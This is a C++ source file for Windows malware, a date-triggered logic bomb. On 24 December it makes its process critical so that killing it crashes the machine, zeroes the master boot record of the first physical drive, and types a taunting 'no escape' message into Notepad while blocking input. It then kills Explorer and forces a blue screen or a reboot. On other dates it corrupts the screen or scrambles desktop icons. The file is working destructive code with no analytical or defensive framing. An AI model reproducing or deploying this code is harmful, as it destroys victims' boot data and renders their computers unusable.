#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <CommCtrl.h>
#include <winternl.h>
#include <iostream> 
#include <tlhelp32.h> 
#include <tchar.h> 
#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
BOOLEAN bl;
ULONG BreakOnTermination;
NTSTATUS status;
char cmd[10];
void move() {
	HWND  hwndParent = ::FindWindowA("Progman", "Program Manager");
	HWND  hwndSHELLDLL_DefView = ::FindWindowEx(hwndParent, NULL, L"SHELLDLL_DefView", NULL);
	HWND  hwndSysListView32 = ::FindWindowEx(hwndSHELLDLL_DefView, NULL, L"SysListView32", L"FolderView");

	int Nm = ListView_GetItemCount(hwndSysListView32);

	int sNm = 360 / Nm;

	int x = 0, y = 0;
	int speedx = 30;
	int speedy = 30;
	int i = 0;
	while (true)
	{
		x += speedx;
		y += speedy;
		if (x > 1920 + 1920 - 50 / 2)
			speedx = -30;
		if (x < 0)
			speedx = 30;
		if (y > 1080 - 50 / 2)
			speedy = -30;
		if (y < 0)
			speedy = 30;

		if (i < Nm)
			i++;
		else
			i = 0;

		::SendMessage(hwndSysListView32, LVM_SETITEMPOSITION, i, MAKELPARAM(x, y));
		ListView_RedrawItems(hwndSysListView32, i, i + 1);
		//		ListView_RedrawItems(hwndSysListView32, 0, ListView_GetItemCount(hwndSysListView32) - 1);
		::UpdateWindow(hwndSysListView32);
		Sleep(50);
	}
}
void dark() {
	HDC hdc = GetDC(HWND_DESKTOP);

	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);

	while (1) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(hdc, rand() % 2, rand() % 2, rand() % sw, rand() % sh, hdc, rand() % 2, rand() % 2, SRCAND);
		Sleep(3);
	}
}
BOOLEAN tmp1;
DWORD tmp2;
void killWindowsInstant() {
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		__asm {
			push offset tmp1

			push byte ptr 0
			push byte ptr 1
			push dword ptr 19

			call RtlAdjustPrivilege

			push offset tmp2

			push dword ptr 6
			push dword ptr 0
			push dword ptr 0
			push dword ptr 0

			push dword ptr 0xc0000022

			call NtRaiseHardError
		};
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}
//void last() {
//	char mbrData[512];
//	ZeroMemory(&mbrData, (sizeof mbrData));
//	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
//	DWORD write;
//	WriteFile(MBR, mbrData, 512, &write, NULL);
//	CloseHandle(MBR);
//	if (MessageBoxA(NULL, "There is No Escape Now do not try to kill the process your computer is now done for anyway do you want to enjoy the last minutes using your computer?", "NO ESCAPE", MB_YESNO) == IDYES)
//	{
//		ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
//		ShellExecute(NULL, NULL, L"calc.exe", NULL, NULL, SW_SHOW);
//		ShellExecute(NULL, NULL, L"notepad.exe", NULL, NULL, SW_SHOW);
//		ShellExecute(NULL, NULL, L"mspaint.exe", NULL, NULL, SW_SHOW);
//		//ShellExecute(NULL, NULL, L"powershell.exe", NULL, NULL, SW_SHOW);
//		//ShellExecute(NULL, NULL, L"taskmgr.exe", NULL, NULL, SW_SHOW);
//		dark();
//	}
//	else
//	{
//		killWindowsInstant();
//	}
//}
void lol();
void hello() {
	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	PROCESSENTRY32 ProcessEntry = { 0 };
	ProcessEntry.dwSize = sizeof(ProcessEntry);

	BOOL Return = FALSE;
Label:Return = Process32First(hProcessSnapShot, &ProcessEntry);

	if (!Return)
	{
		goto Label;
	}

	do
	{
		int value = _tcsicmp(ProcessEntry.szExeFile, _T("notepad.exe"));
		//replace the taskmgr.exe to the process u want to remove. 
		if (value == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}

	} while (Process32Next(hProcessSnapShot, &ProcessEntry));

	CloseHandle(hProcessSnapShot);
}
void simple() {
	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	PROCESSENTRY32 ProcessEntry = { 0 };
	ProcessEntry.dwSize = sizeof(ProcessEntry);

	BOOL Return = FALSE;
Label:Return = Process32First(hProcessSnapShot, &ProcessEntry);

	if (!Return)
	{
		goto Label;
	}

	do
	{
		int value = _tcsicmp(ProcessEntry.szExeFile, _T("explorer.exe"));
		//replace the taskmgr.exe to the process u want to remove. 
		if (value == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}

	} while (Process32Next(hProcessSnapShot, &ProcessEntry));

	CloseHandle(hProcessSnapShot);
}
int main() {
	FreeConsole();
	SYSTEMTIME time;
	GetSystemTime(&time);
	if (time.wMonth == 12 && time.wDay == 24) {
		RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
		BreakOnTermination = 1;

		status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
		char mbrData[512];
		ZeroMemory(&mbrData, (sizeof mbrData));
		HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		DWORD write;
		WriteFile(MBR, mbrData, 512, &write, NULL);
		CloseHandle(MBR);
		ShellExecute(NULL, NULL, L"notepad.exe", NULL, NULL, SW_SHOW);
		Sleep(2000);
		lol();
		while (1) {
			HWND some = FindWindow(NULL, L"Untitled - Notepad");
			if (GetKeyState('Y') & 0x8000/*Check if high-order bit is set (1 << 15)*/)
			{
				//ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
				//ShellExecute(NULL, NULL, L"taskkill /f /im notepad.exe", NULL, NULL, SW_HIDE);
				hello();
				simple();
				Sleep(2000);
				ShellExecute(NULL, NULL, L"calc.exe", NULL, NULL, SW_SHOW);
				ShellExecute(NULL, NULL, L"notepad.exe", NULL, NULL, SW_SHOW);
				ShellExecute(NULL, NULL, L"mspaint.exe", NULL, NULL, SW_SHOW);
				dark();
				Sleep(30000);
				killWindowsInstant();
			}
			if (GetKeyState('N') & 0x8000) {
				killWindowsInstant();
			}
			if (!some) {
				killWindowsInstant();
			}
			Sleep(100000);
			killWindowsInstant();
		}

	}
	if (time.wMonth == 3 && time.wDay == 13) {
		RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
		BreakOnTermination = 1;

		status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
		move();
	}
	if (time.wMonth == 5 && time.wDay == 4) {
		RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
		BreakOnTermination = 1;

		status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
		dark();
	}
	if (time.wMonth == 1 && time.wDay == 5) {
		MessageBoxA(NULL, "Fred Durst Says:", "No computer today silly boy go outsie and play", MB_ICONERROR);

	}
}
void lol() {
	BlockInput(true);
	HWND hWnd = FindWindow(NULL, L"Untitled - Notepad");
	HWND edit = FindWindowEx(hWnd, NULL, L"Edit", NULL);
	SetForegroundWindow(hWnd);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'F', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'W', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'J', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'H', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'A', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'N', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'G', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'Y', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'R', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'?', 0);

	BlockInput(false);

}
